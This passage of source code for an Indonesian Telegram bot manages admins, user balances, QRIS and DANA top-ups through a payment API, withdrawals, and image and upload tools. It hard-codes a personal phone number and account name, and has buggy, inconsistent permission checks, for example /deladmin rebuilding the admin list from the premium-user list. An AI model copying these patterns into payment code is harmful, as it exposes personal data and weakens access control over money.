  await bot.sendMessage(senderId, `✅ Admin baru berhasil ditambahkan!\n👤 ID: <code>${newAdminId}</code>`, { parse_mode: "HTML" });

  try {
    await bot.sendMessage(newAdminId, `🎉 Kamu telah ditambahkan sebagai *Admin* oleh <b>${msg.from.first_name}</b>.`, { parse_mode: "HTML" });
  } catch (err) {
    console.log("Gagal kirim notifikasi ke admin baru:", err.message);
  }
});

// === /deladmin <user_id> ===
bot.onText(/\/deladmin (\d+)/, async (msg, match) => {
  const senderId = msg.from.id;
  const targetId = Number(match[1]);

  if (!setting.ADMIN_IDS.includes(senderId))
    return bot.sendMessage(senderId, "❌ Kamu tidak punya izin menghapus admin.");

  if (!setting.ADMIN_IDS.includes(targetId))
    return bot.sendMessage(senderId, "⚠️ User ini bukan admin.");

  setting.ADMIN_IDS = premiumUsers.filter(id => id !== targetId);

  // Simpan ke setting.js
  const configPath = path.join(__dirname, "setting.js");
  const updatedConfig = `export default ${JSON.stringify(setting, null, 2)};\n`;
  fs.writeFileSync(configPath, updatedConfig, "utf8");

  await bot.sendMessage(senderId, `🗑️ Admin dengan ID <code>${targetId}</code> berhasil dihapus.`, { parse_mode: "HTML" });

  try {
    await bot.sendMessage(targetId, `⚠️ Kamu telah dihapus dari daftar *Admin Bot*.`, { parse_mode: "HTML" });
  } catch (err) {
    console.log("Gagal kirim notifikasi ke user:", err.message);
  }
});

// === /listadmin ===
bot.onText(/\/listadmin/, async (msg) => {
  const userId = msg.from.id;
  if (!setting.ADMIN_IDS.includes(userId))
    return bot.sendMessage(userId, "❌ Hanya admin yang bisa melihat daftar admin.");

  if (!setting.ADMIN_IDS.length)
    return bot.sendMessage(userId, "📭 Belum ada admin yang terdaftar.");

  let text = "👑 <b>Daftar Admin Aktif:</b>\n";
  for (const id of setting.ADMIN_IDS) {
    text += `• <code>${id}</code>\n`;
  }

  await bot.sendMessage(userId, text, { parse_mode: "HTML" });
});

  // ─── /cekid acc tele ────────────────────
bot.onText(/\/cekid/, (msg) => {
    const chatId = msg.chat.id;
    const username = msg.from.username || msg.from.first_name || 'Tidak Ada';
    const idTele = msg.from.id;
    const cekIdImageUrl = 'https://i.ibb.co/fTywFQR/20251107-022237.jpg'; // Ganti dengan URL banner

    const caption = `👋 Hi *${username}*\n\n` +
        `📌 *ID Telegram Anda:* \`${idTele}\`\n` +
        `📌 *Username:* @${username}\n\n` +
        `Itu adalah ID Telegram Anda 😉\n` +
        `Developer: @yamzzzx`;

    const options = {
        caption: caption,
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [
                [
                    { text: '📋 Salin ID', url: `tg://msg?text=${idTele}` }
                ],
                [
                    { text: '📤 Bagikan ID', switch_inline_query: idTele }
                ],
                [
                    { text: '👤 Lihat Profil', url: `https://t.me/${username}` }
                ]
            ]
        }
    };

    bot.sendPhoto(chatId, cekIdImageUrl, options);
});

  // ─── /addsaldo ────────────────────
bot.onText(/^(\.|\#|\/)addsaldo$/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();
    const reply = msg.reply_to_message;
    const targetMessageId = reply ? reply.message_id : msg.message_id;
      // Cek Apakah User Owner
      if (userId !== owner) {
    return bot.sendMessage(chatId, "❌ Akses ditolak! Hanya owner yang dapat menggunakan perintah ini.", {
      reply_to_message_id: targetMessageId,
      reply_markup: {
        inline_keyboard: [
          [{ text: "HUBUNGI ADMIN", url: "https://t.me/yamzzzx" }]
        ]
      }
    });
  }
    
    bot.sendMessage(
        chatId,
        `⚠️ Format salah!\nContoh penggunaan:\n/addsaldo idtele,20000`,
        { reply_to_message_id: targetMessageId } // Balas pesan target yang telah ditentukan
    );
});

bot.onText(/^(\.|\#|\/)addsaldo\s+(.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const reply = msg.reply_to_message;
  const q = match[2];

  if (!setting.ADMIN_IDS.includes(userId)) {
    return bot.sendMessage(
      chatId,
      '❌ Akses ditolak! Hanya developer yang dapat menggunakan perintah ini.',
      { reply_to_message_id: msg.message_id }
    );
  }

  // Validasi format input
  const [idtelegram, nominal] = q.split(",");
  if (!idtelegram || !nominal) {
    return bot.sendMessage(chatId, `⚠️ Format Salah!\n\n🔹 Contoh Penggunaan:\n/addsaldo idtele,20000`);
  }

  const amount = Number(nominal);
  if (isNaN(amount) || amount <= 0) {
    return bot.sendMessage(chatId, `❌ Nominal tidak valid. Harus berupa angka lebih dari 0.`);
  }

  // ID target langsung dari idtelegram, tanpa @s.whatsapp.net
  const targetID = idtelegram.trim();

  // Fungsi addSaldo menerima idtelegram langsung
  addSaldo(targetID, amount, db_saldo);

  // Kirim pesan konfirmasi ke admin
  bot.sendMessage(chatId, `✅ Deposit Berhasil!\n\n🆔 ID Telegram: ${targetID}\n💰 Jumlah: Rp${toRupiah(amount)}\n\n📝 Cek saldo dengan perintah: /ceksaldo ${targetID}`);

  // (Opsional) Kirim ke user jika punya sistem notifikasi internal
  // bot.sendMessage(targetID, `✅ Saldo kamu bertambah Rp${toRupiah(amount)}!`);

});

  // ─── /delsaldo ────────────────────
bot.onText(/^(\.|\#|\/)delsaldo$/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();
    const reply = msg.reply_to_message;
    const targetMessageId = reply ? reply.message_id : msg.message_id;
      // Cek Apakah User Owner
      if (userId !== owner) {
    return bot.sendMessage(chatId, "❌ Akses ditolak! Hanya owner yang dapat menggunakan perintah ini.", {
      reply_to_message_id: targetMessageId,
      reply_markup: {
        inline_keyboard: [
          [{ text: "HUBUNGI ADMIN", url: "https://t.me/yamzzzx" }]
        ]
      }
    });
  }
    
    bot.sendMessage(
        chatId,
        `⚠️ Format salah!\nContoh penggunaan:\n/delsaldo idtele,20000`,
        { reply_to_message_id: targetMessageId } // Balas pesan target yang telah ditentukan
    );
});

bot.onText(/^(\.|\#|\/)delsaldo\s+(.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const reply = msg.reply_to_message;
  const q = match[2];
  const [idtelegram, nominal] = q.split(",");

  if (!setting.ADMIN_IDS.includes(userId)) {
    return bot.sendMessage(
      chatId,
      '❌ Akses ditolak! Hanya developer yang dapat menggunakan perintah ini.',
      { reply_to_message_id: msg.message_id }
    );
  }

  if (!idtelegram || !nominal) {
    return bot.sendMessage(chatId, `⚠️ Format Salah!\n\n🔹 Contoh:\n/delsaldo idtelegram,10000`);
  }

  const amount = Number(nominal);
  if (isNaN(amount) || amount <= 0) {
    return bot.sendMessage(chatId, `❌ Nominal tidak valid. Harus angka > 0`);
  }

  if (!db_saldo[idtelegram] || db_saldo[idtelegram] < amount) {
    return bot.sendMessage(chatId, `❌ Saldo tidak cukup atau ID tidak ditemukan.`);
  }

  db_saldo[idtelegram] -= amount;

  fs.writeFileSync('./source/saldo.json', JSON.stringify(db_saldo, null, 2));
  bot.sendMessage(chatId, `✅ Berhasil mengurangi saldo ${idtelegram} sebesar Rp${toRupiah(amount)}.\n💰 Sisa saldo: Rp${toRupiah(db_saldo[idtelegram])}`);
});

  // ─── /resetsaldo ────────────────────
bot.onText(/^(\.|\#|\/)resetsaldo$/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();
    const reply = msg.reply_to_message;
    const targetMessageId = reply ? reply.message_id : msg.message_id;
      // Cek Apakah User Owner
      if (userId !== owner) {
    return bot.sendMessage(chatId, "❌ Akses ditolak! Hanya owner yang dapat menggunakan perintah ini.", {
      reply_to_message_id: targetMessageId,
      reply_markup: {
        inline_keyboard: [
          [{ text: "HUBUNGI ADMIN", url: "https://t.me/yamzzzx" }]
        ]
      }
    });
  }
    
    bot.sendMessage(
        chatId,
        `⚠️ Format salah!\nContoh penggunaan:\n/resetsaldo idtele`,
        { reply_to_message_id: targetMessageId } // Balas pesan target yang telah ditentukan
    );
});

bot.onText(/^(\.|\#|\/)resetsaldo\s+(\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const idtelegram = match[2];

  if (!setting.ADMIN_IDS.includes(userId)) {
    return bot.sendMessage(
      chatId,
      '❌ Akses ditolak! Hanya developer yang dapat menggunakan perintah ini.',
      { reply_to_message_id: msg.message_id }
    );
  }

  if (!idtelegram) {
    return bot.sendMessage(chatId, `⚠️ Format Salah!\n\n🔹 Contoh:\n/resetsaldo 123456789`);
  }

  const userExist = db_saldo.find((user) => user.id === idtelegram);
  if (!userExist) {
    return bot.sendMessage(chatId, `❌ ID Telegram ${idtelegram} tidak ditemukan dalam database saldo.`);
  }

  resetSaldo(idtelegram, db_saldo);

  bot.sendMessage(chatId, `✅ Saldo ID ${idtelegram} berhasil direset menjadi Rp0.`);
});

  // ─── /ceksaldo ────────────────────
bot.onText(/^(\.|\#|\/)ceksaldo$/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();
    const reply = msg.reply_to_message;
    const targetMessageId = reply ? reply.message_id : msg.message_id;
    
    bot.sendMessage(
        chatId,
        `⚠️ Format salah!\nContoh penggunaan:\n/ceksaldo idtelegram`,
        { reply_to_message_id: targetMessageId } // Balas pesan target yang telah ditentukan
    );
});

bot.onText(/^(\.|\#|\/)ceksaldo\s+(.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const reply = msg.reply_to_message;
  const idtelegram = match[2].trim();
  
  
  if (!idtelegram) {
    return bot.sendMessage(chatId, `⚠️ Format Salah!\n\n🔹 Contoh Penggunaan:\n/ceksaldo idtelegram`);
  }

  // Ambil saldo dari database
  let saldo = cekSaldo(idtelegram, db_saldo); // asumsikan fungsi cekSaldo() sudah ada
  saldo = saldo || 0;

  // Kirim saldo ke admin
  bot.sendMessage(chatId, `💳 CEK SALDO\n\n🆔 ID Telegram: ${idtelegram}\n💰 Saldo Saat Ini: Rp${toRupiah(saldo)}`);
});

  // ─── /listsaldo ────────────────────
bot.onText(/^(\.|\#|\/)listsaldo$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!setting.ADMIN_IDS.includes(userId)) {
    return bot.sendMessage(
      chatId,
      '❌ Akses ditolak! Hanya developer yang dapat menggunakan perintah ini.',
      { reply_to_message_id: msg.message_id }
    );
  }

  // Baca saldo dari file saldo.json
  let _dir = [];
  try {
    const raw = fs.readFileSync('./source/saldo.json');
    _dir = JSON.parse(raw);
  } catch (e) {
    return bot.sendMessage(chatId, '❌ Gagal membaca data saldo.');
  }

  if (_dir.length === 0) {
    return bot.sendMessage(chatId, '📭 Tidak ada data saldo yang tersimpan.');
  }

  const list = listSaldo(_dir);
  bot.sendMessage(chatId, `📋 *Daftar Saldo User:*\n\n${list}`, { parse_mode: 'Markdown' });
});

  // ─── /topupsaldo ────────────────────
bot.onText(/^\/topupsaldo\s+(\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const username = msg.from.username || msg.from.first_name;
  const nominal = parseInt(match[1]);

  if (isNaN(nominal) || nominal < 500) {
    return bot.sendMessage(chatId, '❌ Nominal tidak valid. Minimal Rp500.\nContoh: /topupsaldo 10000');
  }

  // Simpan request sementara
  userPendingTopup[userId] = nominal;

  // Notifikasi ke developer
  for (let dev of owner) {
    bot.sendMessage(dev, `📥 Permintaan Topup Baru\n\n🆔 ID Pengguna: ${userId}\n💰 Nominal: Rp${toRupiah(nominal)}\n\nMenunggu user memilih metode pembayaran.`);
  }

  // Kirim pilihan metode pakai inline button
  bot.sendMessage(chatId,
    `🔰 *TOPUP SALDO*\n\n💳 Nominal: Rp${toRupiah(nominal)}\n\nPilih metode pembayaran:`,
    {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: "📱 Dana", callback_data: `pay_dana_${userId}` }],
          [{ text: "💳 QRIS Manual", callback_data: `pay_qris_${userId}` }],
          [{ text: "⚡ QRIS (Otomatis)", callback_data: `pay_atlantic_${userId}` }]
        ]
      }
    }
  );
});

// ✅ Handler tombol pembayaran
bot.on('callback_query', async (query) => {
  const data = query.data;
  const chatId = query.message.chat.id;
  const userId = query.from.id;
  const username = query.from.username || query.from.first_name;

  // Pastikan ada pending topup
  const nominal = userPendingTopup[userId];
  if (!nominal) {
    return bot.answerCallbackQuery(query.id, { text: "Tidak ada topup aktif!", show_alert: false });
  }

  if (data.startsWith("pay_dana")) {
    await bot.answerCallbackQuery(query.id);
    bot.sendMessage(chatId,
      `🔁 *Pembayaran via DANA*\n\nSilakan transfer Rp${toRupiah(nominal)} ke:\n\n📱 Nomor DANA: 085710795025\nA/n: Noval Renaldy\n\nLalu kirim bukti ke developer:\nt.me/yamzzzx`,
      { parse_mode: 'Markdown' }
    );

  } else if (data.startsWith("pay_qris")) {
    await bot.answerCallbackQuery(query.id);
    bot.sendPhoto(chatId, "https://t1.pixhost.to/thumbs/9558/653344918_img_20251020_192829_477.jpg", {
      caption: `🔁 *Pembayaran via QRIS Manual*\n\nSilakan transfer Rp${toRupiah(nominal)} ke QRIS di atas.\n\nLalu kirim bukti ke developer:\nt.me/yamzzzx`,
      parse_mode: 'Markdown'
    });

  } else if (data.startsWith("pay_atlantic")) {
    await bot.answerCallbackQuery(query.id);
    if (activeDeposit[userId]) {
      return bot.sendMessage(chatId, "❗ Masih ada transaksi aktif.\nKetik .batalbeli untuk membatalkan.");
    }

    const jumlah = nominal;
    const total = jumlah + setting.FeeTransaksi;
    const reff = `DEPO-${Math.floor(Math.random() * 1000000)}`;

    try {
      const depositData = qs.stringify({
        api_key: setting.ApikeyAtlantic,
        reff_id: reff,
        nominal: total,
        type: 'ewallet',
        metode: 'qris'
      });

      const res = await axios.post('https://atlantich2h.com/deposit/create', depositData, {
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
      });

      const dataRes = res.data;
      if (!dataRes.status) {
        return bot.sendMessage(chatId, `❌ Gagal membuat QRIS.\n${dataRes.message || "Silakan coba lagi."}`);
      }

      const info = dataRes.data;
      const qrImage = await QRCode.toBuffer(info.qr_string, { type: 'png' });

      const teks = `
┏━━━━━━━━━━━━━━━━━━━━┓
┃💸 *DEPOSIT QRIS ATLANTIC* 💸
┗━━━━━━━━━━━━━━━━━━━━┛
🆔 Kode Transaksi: ${reff}
🙎 User: @${username} (${userId})
💰 Jumlah Deposit: Rp${toRupiah(jumlah)}
🧾 Biaya Admin: Rp${toRupiah(setting.FeeTransaksi)}
💳 Total Bayar: Rp${toRupiah(info.nominal)}

⏰ Batas Waktu: 5 Menit
📷 Scan QR di atas untuk pembayaran

━━━━━━━━━━━━━━━━━━━━━━━
⚠️ *Catatan Penting:*
• Jangan tutup Telegram selama proses berlangsung
• Saldo akan otomatis masuk setelah pembayaran
`.trim();

      const sentMsg = await bot.sendPhoto(chatId, qrImage, {
        caption: teks,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "❌ Batalkan Deposit", callback_data: "batalbuy" }]]
        }
      });

      // Simpan status transaksi
      activeDeposit[userId] = {
        msgId: sentMsg.message_id,
        chatId,
        idDeposit: info.reff_id,
        id: info.id,
        amount: jumlah,
        status: true,
        timeout: setTimeout(async () => {
          if (activeDeposit[userId]?.status) {
            await bot.sendMessage(chatId, "⏰ QRIS Deposit telah expired.");
            await bot.deleteMessage(chatId, activeDeposit[userId].msgId).catch(() => { });
            delete activeDeposit[userId];
          }
        }, 300000)
      };

      // Loop pengecekan status
      while (activeDeposit[userId] && activeDeposit[userId].status) {
        await sleep(5000);
        const check = await axios.post('https://atlantich2h.com/deposit/status', qs.stringify({
          api_key: setting.ApikeyAtlantic,
          id: activeDeposit[userId].id
        }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }).then(r => r.data).catch(() => null);

        const status = check?.data;
        if (status && status.status !== 'pending') {
          activeDeposit[userId].status = false;
          clearTimeout(activeDeposit[userId].timeout);

          await axios.post('https://atlantich2h.com/deposit/instant', qs.stringify({
            api_key: setting.ApikeyAtlantic,
            id: activeDeposit[userId].id,
            action: true
          }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }).catch(() => { });

          const saldoPath = './atlantik/saldo.json';
          let saldo = fs.existsSync(saldoPath) ? JSON.parse(fs.readFileSync(saldoPath)) : {};
          saldo[userId] = (saldo[userId] || 0) + jumlah;
          fs.writeFileSync(saldoPath, JSON.stringify(saldo, null, 2));

          const waktu = moment().tz("Asia/Jakarta").format("YYYY-MM-DD HH:mm:ss");

          await bot.deleteMessage(chatId, activeDeposit[userId].msgId).catch(() => { });
          await bot.sendMessage(chatId, `
✅ Deposit Berhasil!
━━━━━━━━━━━━━━━━━━━━━━━
🧾 Jumlah: Rp${toRupiah(jumlah)}
💳 Saldo Sekarang: Rp${toRupiah(saldo[userId])}
⏰ Tanggal: ${waktu}
━━━━━━━━━━━━━━━━━━━━━━━
#Lalu kirim bukti ke developer:\nt.me/yamzzzx
`.trim(), { parse_mode: "Markdown" });

          const notif = `
📢 DEPOSIT SUKSES!
━━━━━━━━━━━━━━━━━━━━━━━
🆔 Kode Transaksi: ${reff}
🙎 User: @${username} (${userId})
💰 Jumlah Deposit: Rp${toRupiah(jumlah)}
💼 Saldo: Rp${toRupiah(saldo[userId])}
📆 Tanggal: ${waktu}
`.trim();

          await bot.sendMessage(owner, notif, { parse_mode: "Markdown" });
          await bot.sendMessage('-1003160985099', notif, { parse_mode: "Markdown" }).catch(() => { });

          delete activeDeposit[userId];
        }
      }

    } catch (err) {
      console.error("DEPOSIT ERROR:", err.response?.data || err.message);
      return bot.sendMessage(chatId, "❌ Gagal memproses deposit. Silakan coba lagi.");
    }
  }
});

  // ─── /konfirmasi ────────────────────
bot.onText(/^(\.|\#|\/)konfirmasi$/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();
    const reply = msg.reply_to_message;
    const targetMessageId = reply ? reply.message_id : msg.message_id;
      // Cek Apakah User Owner
      if (userId !== owner) {
    return bot.sendMessage(chatId, "❌ Akses ditolak! Hanya owner yang dapat menggunakan perintah ini.", {
      reply_to_message_id: targetMessageId,
      reply_markup: {
        inline_keyboard: [
          [{ text: "HUBUNGI ADMIN", url: "https://t.me/yamzzzx" }]
        ]
      }
    });
  }
    
    bot.sendMessage(
        chatId,
        `⚠️ Format salah!\nContoh penggunaan:\n/konfirmasi idtele,20000`,
        { reply_to_message_id: targetMessageId } // Balas pesan target yang telah ditentukan
    );
});

bot.onText(/^\/konfirmasi\s+(\d+),(\d+)/, async (msg, match) => {
  const userId = msg.from.id;
  const targetID = match[1];
  const nominal = parseInt(match[2]);

  if (!owner.includes(userId)) {
    return bot.sendMessage(msg.chat.id, '❌ Akses ditolak. Hanya developer yang dapat melakukan konfirmasi.');
  }

  if (isNaN(nominal) || nominal <= 0) {
    return bot.sendMessage(msg.chat.id, '❌ Nominal tidak valid.');
  }

  // Tambahkan saldo
  addSaldo(targetID, nominal, db_saldo);

  // Notifikasi ke user
  bot.sendMessage(targetID, `✅ Saldo kamu telah ditambahkan sebesar Rp${toRupiah(nominal)}.\nCeksaldo anda:\n/ceksaldo <idtelemu>`);

  // Notifikasi ke developer
  bot.sendMessage(msg.chat.id, `✅ Saldo sebesar Rp${toRupiah(nominal)} berhasil ditambahkan ke ID ${targetID}.`);
});

  // ─── /withdraw ────────────────────
bot.onText(/^([./]{0,2})?(withdraw|cairkan)$/i, async (msg) => {  
    const chatId = msg.chat.id;  
    const userId = msg.from.id.toString();  
    const replyMessage = msg.reply_to_message;  
    const targetMessageId = replyMessage ? replyMessage.message_id : msg.message_id;  
  
    if (userId !== owner) {  
    return bot.sendMessage(chatId, "❌ Hanya owner yang bisa mengakses perintah ini.");  
  }  
    
    try {  
        function sensorString(input, visibleCount = 3, maskChar = 'X') {  
            if (input.length <= visibleCount) return input;  
            const visiblePart = input.slice(0, visibleCount);  
            const maskedPart = maskChar.repeat(input.length - visibleCount);  
            return visiblePart + maskedPart;  
        }  
  
        function sensorWithSpace(str, visibleCount = 3, maskChar = 'X') {  
            let result = '';  
            let count = 0;  
            for (let char of str) {  
                if (char === ' ') {  
                    result += char;  
                } else if (count < visibleCount) {  
                    result += char;  
                    count++;  
                } else {  
                    result += maskChar;  
                }  
            }  
            return result;  
        }  
  
        // ✅ Ambil saldo Atlantic  
        const statusUrl = 'https://atlantich2h.com/get_profile';  
        const statusData = qs.stringify({ api_key: apiAtlantic });  
  
        const res = await axios.post(statusUrl, statusData, {  
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' }  
        });  
  
        const saldoAwal = res?.data?.data?.balance;  
        const totalsaldo = Math.max(0, saldoAwal - 2000); // potong 2000  
  
        // ✅ Proses pencairan  
        const statusUrl2 = 'https://atlantich2h.com/transfer/create';  
        const statusData2 = qs.stringify({  
            api_key: apiAtlantic,  
            ref_id: `${Date.now()}`,  
            kode_bank: typeewallet,  
            nomor_akun: nopencairan,  
            nama_pemilik: atasnamaewallet,  
            nominal: totalsaldo.toString()  
        });  
  
        const ress = await axios.post(statusUrl2, statusData2, {  
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' }  
        });  
  
        const ids = ress?.data?.data?.id;  
  
        // ✅ Kirim informasi withdraw (reply)  
        await bot.sendMessage(chatId, `  
💳 Informasi Pencairan Saldo:  
  
- Nominal: Rp${await toRupiah(saldoAwal)}  
- Fee Pencairan: Rp2000  
- Tujuan: ${sensorString(nopencairan)}  
- Type Ewallet: ${typeewallet}  
- Nama Pemilik: ${sensorWithSpace(atasnamaewallet)}  
- Status: ${ress.data.data.status}  
  
Memproses Pencairan Saldo.  
`, { reply_to_message_id: targetMessageId });  
  
        // ✅ Loop cek status  
        let running = true;  
        while (running) {  
            const statusUrl3 = 'https://atlantich2h.com/transfer/status';  
            const statusData3 = qs.stringify({  
                api_key: apiAtlantic,  
                id: ids  
            });  
  
            const checkRes = await axios.post(statusUrl3, statusData3, {  
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }  
            });  
  
            const result = checkRes?.data?.data || {};  
            if (result?.status !== "pending") {  
                await bot.sendMessage(chatId, `  
✅Pencairan Berhasil!  
  
- Nominal: Rp${await toRupiah(saldoAwal)}  
- Fee Pencairan: Rp2000  
- Tujuan: ${sensorString(nopencairan)}  
- Type Ewallet: ${typeewallet}  
- Nama Pemilik: ${sensorWithSpace(atasnamaewallet)}  
- Status: ${result.status}  
  
Saldo Berhasil Dikirim Ke Ewallet Pribadi ✅
`, { reply_to_message_id: targetMessageId });  
                break;  
            }  
  
            await sleep(5000);  
        }  
  
    } catch (err) {  
        console.error('Error proses pencairan saldo:', err.response?.data || err.message);  
        return bot.sendMessage(chatId, `❌ Gagal mengambil data saldo, silakan coba lagi nanti.\n\n${err.response?.data?.message || err.message}`, {  
            reply_to_message_id: targetMessageId  
        });  
    }  
});

// ─── /iqc ────────────────────
    bot.onText(/\/iqc(.*)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const text = match[1]?.trim();

        // ✅ CHECK MEMBERSHIP FIRST
        const joined = await isMember(userId);
        if (!joined) {
            await sendJoinChannel(chatId);
            return;
        }

        if (!text) {
            return await withRetry(() =>
                bot.sendMessage(chatId, "⚠️ Format:\n/iqc jam|batre|provider|pesan\n\nContoh:\n/iqc 18:00|40|Indosat|hai hai")
            );
        }

        const [time, battery, carrier, ...pesan] = text.split("|");
        if (!time || !battery || !carrier || pesan.length === 0) {
            return await withRetry(() =>
                bot.sendMessage(chatId, "⚠️ Format salah!\nGunakan:\n/iqc jam|batre|provider|pesan")
            );
        }

        const messageText = pesan.join("|").trim();
        const url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&batteryPercentage=${encodeURIComponent(battery)}&carrierName=${encodeURIComponent(carrier)}&messageText=${encodeURIComponent(messageText)}&emojiStyle=apple`;

        await withRetry(() =>
            bot.sendMessage(chatId, "⏳ Sedang membuat gambar, tunggu sebentar...")
        );

        try {
            const res = await fetchWithTimeout(url, {}, 30000);
            if (!res.ok) throw new Error(`Gagal ambil API: ${res.status}`);

            const buffer = Buffer.from(await res.arrayBuffer());

            if (buffer.length < 1000) throw new Error("API tidak kirim gambar valid");

            await withRetry(() =>
                bot.sendPhoto(chatId, buffer, {
                    caption: `✅ *Sukses Membuat Gaya iPhone!*\n🕒 ${time}\n🔋 ${battery}% | ${carrier}\n💬 ${messageText}`,
                    parse_mode: "Markdown"
                })
            );

        } catch (err) {
            console.error("Error di /iqc:", err.message);
            await withRetry(() =>
                bot.sendMessage(chatId, `❌ Gagal membuat gambar: ${err.message}\n\n📄 Fallback:\n🕒 ${time}\n🔋 ${battery}% | ${carrier}\n💬 ${messageText}`)
            );
        }
    });

// ─── /tourl ────────────────────
    bot.onText(/\/tourl/, async (msg) => {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        
        // ✅ CHECK MEMBERSHIP FIRST
        const joined = await isMember(userId);
        if (!joined) {
            await sendJoinChannel(chatId);
            return;
        }
        
        const waktu = checkCooldown(userId);
        if (waktu > 0) {
            return await withRetry(() =>
                bot.sendMessage(chatId, `⏳ Tunggu ${waktu} detik sebelum bisa pakai command /tourl lagi!`, { 
                    reply_to_message_id: msg.message_id 
                })
            );
        }
        
        const repliedMsg = msg.reply_to_message;

        if (!repliedMsg || (!repliedMsg.document && !repliedMsg.photo && !repliedMsg.video)) {
            return await withRetry(() =>
                bot.sendMessage(chatId, "⚠️ Reply foto/video/document dengan command /tourl", {
                    reply_to_message_id: msg.message_id
                })
            );
        }

        let fileId, fileName, fileType;

        if (repliedMsg.document) {
            fileId = repliedMsg.document.file_id;
            fileName = repliedMsg.document.file_name || `file_${Date.now()}`;
            fileType = 'document';
        } else if (repliedMsg.photo) {
            const photos = repliedMsg.photo;
            fileId = photos[photos.length - 1].file_id;
            fileName = `photo_${Date.now()}.jpg`;
            fileType = 'photo';
        } else if (repliedMsg.video) {
            fileId = repliedMsg.video.file_id;
            fileName = `video_${Date.now()}.mp4`;
            fileType = 'video';
        }

        try {
            const processingMsg = await withRetry(() =>
                bot.sendMessage(chatId, `⏳ ᴍᴇɴɢᴜᴘʟᴏᴀᴅ ${fileType} ᴋᴇ ᴄᴀᴛʙᴏx...`, { 
                    parse_mode: "Markdown", 
                    reply_to_message_id: msg.message_id 
                })
            );

            const file = await withRetry(() => bot.getFile(fileId));
            const fileLink = `https://api.telegram.org/file/bot${setting.token}/${file.file_path}`;

            const fileResponse = await axios.get(fileLink, { 
                responseType: 'arraybuffer',
                timeout: 60000 
            });
            const buffer = Buffer.from(fileResponse.data);

            const form = new FormData();
            form.append('reqtype', 'fileupload');
            form.append('fileToUpload', buffer, {
                filename: fileName,
                contentType: fileResponse.headers['content-type'] || 'application/octet-stream',
            });

            const { data: catboxUrl } = await axios.post('https://catbox.moe/user/api.php', form, {
                headers: form.getHeaders(),
                timeout: 60000
            });

            if (!catboxUrl.startsWith('https://')) {
                throw new Error('Catbox tidak mengembalikan URL yang valid');
            }

            await withRetry(() =>
                bot.editMessageText(`*✅ Sukses Upload ${fileType.toUpperCase()}!*\n\n📎 URL: \`${catboxUrl}\``, {
                    chat_id: chatId,
                    parse_mode: "Markdown",
                    message_id: processingMsg.message_id
                })
            );

        } catch (error) {
            console.error("Upload error:", error?.response?.data || error.message);
            await withRetry(() =>
                bot.sendMessage(chatId, `❌ Gagal mengupload ${fileType} ke Catbox: ${error.message}`, {
                    reply_to_message_id: msg.message_id
                })
            );
        }
    });

// ─── /brat ────────────────────
bot.onText(/^(\.|\#|\/)brat$/, async (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, `Format salah example /brat katakatabebas`);
  });

bot.onText(/\/brat (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const text = match[1];

    if (!text) {
        return bot.sendMessage(chatId, 'Contoh penggunaan: /brat teksnya');
    }

    try {
        const imageUrl = `https://kepolu-brat.hf.space/brat?q=${encodeURIComponent(text)}`;
        const tempFilePath = './temp_sticker.webp';
        const downloadFile = async (url, dest) => {
            const writer = fs.createWriteStream(dest);

            const response = await axios({
                url,
                method: 'GET',
                responseType: 'stream',
            });

            response.data.pipe(writer);

            return new Promise((resolve, reject) => {
                writer.on('finish', resolve);
                writer.on('error', reject);
            });
        };

        await downloadFile(imageUrl, tempFilePath);

        await bot.sendSticker(chatId, tempFilePath);

        await fs.promises.unlink(tempFilePath);
    } catch (error) {
        console.error(error.message || error);
        bot.sendMessage(chatId, 'Terjadi kesalahan saat membuat stiker. Pastikan teks valid atau coba lagi.');
    }
});

  // ─── /subdomain ────────────────────
bot.onText(/^\/domain1(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const messageId = msg.message_id;
  const reply = msg.reply_to_message;

  // Cek user Premium
  const premiumUsers = JSON.parse(fs.readFileSync(premiumUsersFile));
  const isPremium = premiumUsers.includes(String(msg.from.id));

  if (!isPremium) {
    return bot.sendMessage(chatId, `❌ Maaf, perintah ini hanya untuk pengguna *Premium Seller Domain*.`, {
      reply_to_message_id: messageId,
      parse_mode: 'Markdown'
    });
  }

  // Ambil teks argumen
  const rawInput = match[1] || (reply && reply.text);
  if (!rawInput) {
    return bot.sendMessage(chatId, `Format salah!\nContoh: /domain1 hostname|192.168.1.1`, {
      reply_to_message_id: messageId
    });
  }

  const [hostRaw, ipRaw] = rawInput.split('|').map(s => s.trim());

  // Validasi host
  const host = (hostRaw || '').replace(/[^a-z0-9.-]/gi, '');
  if (!host) {
    return bot.sendMessage(chatId, `❌ Host tidak valid!\nGunakan huruf, angka, strip (-), atau titik (.)`, {
      reply_to_message_id: messageId
    });
  }

  // Validasi IP
  const ip = (ipRaw || '').replace(/[^0-9.]/gi, '');
  if (!ip || ip.split('.').length !== 4) {
